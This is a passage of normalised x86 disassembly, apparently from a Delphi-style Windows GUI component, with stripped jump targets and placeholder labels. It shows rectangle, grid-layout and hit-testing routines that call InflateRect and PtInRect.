mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x38 ]
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_48a534
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
pop edx
mov ecx edx
cdq
idiv ecx
mov edx [ ebp + 0x8 ]
imul [ edx - 0x14 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
pop edx
mov ecx edx
cdq
idiv ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0xc ]
add eax [ ecx + 0x60 ]
add eax 0x4
imul edx eax
add [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
imul [ ebp - 0x8 ]
add [ ebp - 0x10 ] eax
jmp r-xdata
mov dl 0x1
mov eax [ esi + 0x10 ]
call sub_41dae4
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4885d0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_48a14c
mov edx eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x3ec ]
call [ ebx + 0x3e8 ]
cmp [ ebx + 0x3ea ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x5c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
add eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebp - 0xc ]
sub edx 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ ebp - 0x10 ]
call sub_48a504
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x64 ]
cmp al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x1c ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_483dc4
lea ecx [ ebp - 0x24 ]
or edx 0xffffffff
mov edi [ eax ]
call [ edi + 0x128 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x1c ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_48a534
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp - 0x24 ]
sub edx 0x4
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x74 ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + 0x34 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x6c ]
jmp r-xdata
mov edx 0xffffff
mov eax [ esi + 0x10 ]
call sub_41d9c8
xor edx edx
mov eax [ esi + 0x10 ]
call sub_41dae4
lea edx [ ebp - 0x24 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
mov edx eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edi [ eax ]
call [ edi + 0x128 ]
jmp r-xdata
sub_48a7d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffff4
mov eax [ edi ]
push edi
lea esi [ eax + 0x34 ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi ]
call sub_48a14c
mov esi [ eax + 0x288 ]
mov eax [ edi ]
mov edx [ eax + 0x24 ]
mov eax esi
call sub_472e8c
mov eax [ edi ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4c ]
dec eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0xc ]
call sub_41d6b8
cmp eax 0x20000000
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x10 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41dadc
test al al
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x48 ]
mov eax [ esi + 0x10 ]
call sub_41d9c8
mov eax [ edi ]
lea ebx [ eax + 0x34 ]
mov eax [ ebx + 0xc ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebx + 0x4 ]
mov eax [ edi ]
add edx [ eax + 0x4c ]
mov eax [ ebx ]
mov ecx [ edi ]
add eax [ ecx + 0x4c ]
mov ecx [ ebx + 0x8 ]
add ecx [ ebp - 0x4 ]
call sub_412f04
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x20 ]
dec edx
sar edx 0x1
jns r-xdata
xor edx edx
mov eax [ esi + 0xc ]
call sub_41d6c0
mov eax [ edi ]
mov edx [ eax + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x2
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ edi ]
mov edx [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
call sub_41d9c8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
lea edx [ ebp - 0x24 ]
mov ecx 0x8
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
add eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
adc edx 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x10 ]
call sub_41d994
mov edx eax
mov eax [ esi + 0x10 ]
call sub_41d99c
mov eax [ edi ]
mov eax [ eax + 0x10 ]
call sub_4879c4
test al al
je r-xdata
xor edx edx
mov eax [ esi + 0x10 ]
call sub_41dae4
mov eax [ edi ]
cmp [ eax + 0x4c ] 0x0
jle r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x70 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10c ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48a97c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffff4
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x18 ]
mov eax [ esi ]
add ecx [ eax + 0x60 ]
add ecx 0x8
mov eax [ esi ]
mov edx 0x8
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
mov eax [ esi ]
mov [ eax + 0x68 ] ebx
test ebx ebx
jle r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cdq
idiv ebx
mov edx [ esi ]
mov [ edx + 0x6c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov ecx [ edx + 0x68 ]
cdq
idiv ecx
test edx edx
jle r-xdata
mov eax [ esi ]
mov edx [ eax + 0x30 ]
mov eax [ esi ]
mov eax [ eax + 0x6c ]
call sub_47695c
mov edx [ esi ]
mov [ edx + 0x6c ] eax
jmp r-xdata
mov eax [ esi ]
inc [ eax + 0x6c ]
pop esi
pop ebx
pop ebp
retn
sub_48a9f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x28 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
pop ebp
retn
push 0x64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_48a14c
mov eax [ eax + 0x240 ]
push eax
push 0x3
call sub_4062e4
pop ebp
retn
sub_48aa28
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x58 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
pop ebp
retn
push 0x64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_48a14c
mov eax [ eax + 0x244 ]
push eax
push 0x4
call sub_4062e4
pop ebp
retn
sub_48aa5c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_48a20c
mov eax [ ebp - 0xc ]
call sub_48a14c
mov ebx eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x34c ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebx + 0x288 ]
call sub_472f94
mov [ ebp - 0x14 ] eax
or edx 0xffffffff
mov eax [ ebp - 0xc ]
call sub_48a458
add eax 0x4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
imul [ ebp - 0x18 ]
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fld [ r-xdata ]
fmulp st1
call sub_402b00
mov edx [ ebp - 0xc ]
mov [ edx + 0x60 ] eax
mov eax [ ebp - 0xc ]
call sub_48a3d0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
call sub_41d7e4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
lea esi [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x292 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
dec al
jne r-xdata
push ebp
call sub_48a97c
pop ecx
mov eax [ esi + 0x4 ]
add eax 0x2
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
imul edx [ ebp - 0x14 ]
add eax edx
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
add [ esi + 0x4 ] eax
mov eax [ ebp - 0xc ]
fild [ eax + 0x54 ]
fmul [ r-xdata ]
mov eax [ ebx + 0x239 ]
mov edi [ ebx + 0x231 ]
sub eax edi
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fmulp st1
fld [ r-xdata ]
fmulp st1
call sub_402b00
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x68 ] 0x1
mov edx [ esi + 0x4 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x6c ] eax
mov eax [ esi + 0x4 ]
add eax 0x2
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
imul edx [ ebp - 0x14 ]
add eax edx
mov [ esi + 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebx + 0x29a ]
sub edx [ eax + 0x4c ]
mov [ esi + 0xc ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
lea edi [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0xc ]
call sub_48a458
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x28e ]
mov [ edi ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
je r-xdata
push ebp
call sub_48a97c
pop ecx
mov eax [ esi + 0xc ]
sub eax 0x2
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x6c ]
imul edx [ ebp - 0x14 ]
sub eax edx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
sub [ esi + 0xc ] eax
mov eax [ edi ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
add eax [ ebp - 0x18 ]
add eax 0x2
sub eax [ edi ]
mov edx [ ebp - 0xc ]
imul [ edx + 0x18 ]
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fld [ r-xdata ]
fmulp st1
call sub_402b00
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x60 ] esi
add esi [ ebp - 0x4 ]
add esi 0x4
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
add eax 0x2
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
add [ edi ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0xc ]
call sub_48a458
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x296 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
dec eax
sub al 0x2
jb r-xdata
cmp [ ebx + 0x3f2 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4c ]
sub [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
sub eax [ ebp - 0x18 ]
sub eax 0x2
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x8 ]
mov edx [ ebp - 0x10 ]
sub edx 0x4
sub edx 0x4
sub eax edx
mov edx [ ebp - 0xc ]
imul [ edx + 0x18 ]
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fld [ r-xdata ]
fmulp st1
call sub_402b00
mov esi eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x60 ] esi
mov eax [ ebp - 0x10 ]
sub eax esi
sub eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov [ edi ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x6c ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
inc eax
sub [ edi + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x60 ]
add esi [ ebp - 0x18 ]
add esi 0x4
mov eax [ ebp - 0xc ]
imul esi [ eax + 0x68 ]
add esi 0x8
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4c ]
add edx edx
add edx esi
mov eax [ ebx + 0x240 ]
call sub_47695c
mov esi eax
mov eax [ ebp - 0xc ]
fild [ eax + 0x54 ]
fmul [ r-xdata ]
mov eax [ ebx + 0x235 ]
sub eax [ ebx + 0x22d ]
sub eax esi
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fmulp st1
fld [ r-xdata ]
fmulp st1
call sub_402b00
sar esi 0x1
jns r-xdata
jmp r-xdata
test esi esi
jle r-xdata
mov eax [ ebp - 0xc ]
push esi
lea esi [ eax + 0x34 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebp - 0xc ]
call sub_48a14c
mov edx eax
lea ecx [ ebp - 0x34 ]
mov eax [ ebx + 0x3f4 ]
call [ ebx + 0x3f0 ]
mov eax [ ebp - 0xc ]
push esi
lea edi [ eax + 0x34 ]
lea esi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ ebx + 0x248 ]
sub edx esi
add edx eax
mov [ edi ] edx
add esi [ ebx + 0x248 ]
add eax esi
mov [ edi + 0x8 ] eax
mov eax [ edi ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x60 ]
add eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
imul esi [ eax + 0x6c ]
adc esi 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_48a7d8
pop ecx
mov eax [ ebx + 0x288 ]
mov edi [ eax + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
xor edx edx
mov eax edi
call sub_41d6c0
mov edx 0xffffff
mov eax edi
call sub_41d6c0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x20 ]
mov edi [ ebp - 0x24 ]
sub edi esi
jl r-xdata
mov esi [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
mov edi [ eax + 0x20 ]
sub edi esi
jg r-xdata
xor edx edx
mov eax edi
call sub_41d7bc
mov edx 0x1
mov eax edi
call sub_41d7ec
mov eax ebx
call sub_489d98
mov [ ebp - 0x1c ] eax
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_47695c
mov edx [ ebp - 0xc ]
add eax [ edx + 0x20 ]
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
lea esi [ ebx + 0x28e ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
inc edi
dec edi
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax + 0xc ]
sub al 0x1
jb r-xdata
push ebp
mov eax [ ebp - 0xc ]
mov edx esi
sub edx [ eax + 0x20 ]
mov eax esi
call sub_48a548
pop ecx
inc esi
dec edi
jne r-xdata
push ebp
mov edx [ ebp - 0x24 ]
sub edx esi
mov eax esi
call sub_48a548
pop ecx
dec esi
inc edi
jne r-xdata
jmp r-xdata
push ebp
call sub_48a9f4
pop ecx
add [ esi ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x3c ]
mov [ esi ] eax
jmp r-xdata
je r-xdata
mov eax ebx
call sub_477d94
push ebp
call sub_48a9f4
pop ecx
sub [ esi + 0x8 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec al
je r-xdata
push ebp
call sub_48aa28
pop ecx
add [ esi + 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0xc ]
add eax [ edx + 0x4c ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec al
je r-xdata
push ebp
call sub_48aa28
pop ecx
sub [ esi + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x38 ]
mov [ esi + 0xc ] eax
jmp r-xdata
sub_48af6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_48aff9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax esi
call sub_404094
push esi
mov cl [ ebx + 0x50 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xbc ]
test ebx ebx
jne r-xdata
mov eax esi
call j_sub_404560#2
mov [ eax + ebx - 0x1 ] 0x20
lea eax [ ebp - 0xc ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_40427c
mov eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_40c998
mov ebx eax
test ebx ebx
jle r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b000
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_48b008
push ebp
mov ebp esp
push ebx
push esi
push edi
or esi 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x6c ]
dec ecx
test ecx ecx
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn
inc ecx
xor edx edx
inc edx
dec ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0xc ]
mov edi [ ebp + 0x8 ]
add eax [ edi - 0x8 ]
cmp ebx eax
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x38 ]
inc eax
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x8 ]
imul ebx edx
add eax ebx
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx - 0xc ]
jg r-xdata
mov esi edx
jmp r-xdata
sub_48b060
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
or esi 0xffffffff
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412edc
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
add eax 0x34
push eax
call PtInRect
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_48a534
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x68 ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
test ecx ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x34 ]
cdq
idiv ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_48a14c
mov eax [ eax + 0x288 ]
call sub_472f94
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x68 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
push ebp
call sub_48b008
pop ecx
mov esi eax
jmp r-xdata
inc edi
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec edi
jne r-xdata
add eax [ ebp - 0x14 ]
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
inc eax
mov edx [ ebp - 0x10 ]
imul edx [ ebp - 0x14 ]
add eax edx
cmp eax ebx
jg r-xdata
push ebp
call sub_48b008
pop ecx
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
imul esi
add eax [ ebp - 0x10 ]
mov esi eax
sub_48b174
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax edi
call sub_413ab8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_413ab8
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov ebx eax
mov [ ebx + 0x4 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
lea eax [ ebp - 0x108 ]
mov edx [ ebp - 0x8 ]
mov ecx 0xff
call sub_404330
lea edx [ ebp - 0x108 ]
lea eax [ ebx + 0xc ]
mov cl 0x14
call sub_402c34
lea eax [ ebp - 0x108 ]
mov edx [ ebp + 0xc ]
mov ecx 0xff
call sub_404330
lea edx [ ebp - 0x108 ]
lea eax [ ebx + 0x21 ]
mov cl 0x14
call sub_402c34
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x38 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_414210
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_48b160
cmp edi [ eax + 0x4 ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_48b278
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48b2c2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_48b260
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b2c9
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_48b2d0
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_40d6a0
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ edi ]
call sub_48b160
call sub_403344
inc esi
dec ebx
jne r-xdata
sub_48b304
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48b330
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b337
retn
call sub_48b2d0
sub_48b33c
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xor eax eax
push ebp
push j_sub_403a98
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b4a7
lea eax [ ebp - 0x2c ]
mov edx 0x7
call sub_4040b8
retn
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x40080000
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov al [ r-xdata ]
mov [ rw-data ] al
mov al [ r-xdata ]
mov [ rw-data ] al
mov eax [ r-xdata ]
mov [ ebp - 0x10 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0xc ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_413b28
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x14 ]
mov eax [ r-xdata ]
call sub_48b278
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_48b278
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x1c ]
mov eax [ r-xdata ]
call sub_48b278
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ca4
mov edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_48b278
lea edx [ ebp - 0x24 ]
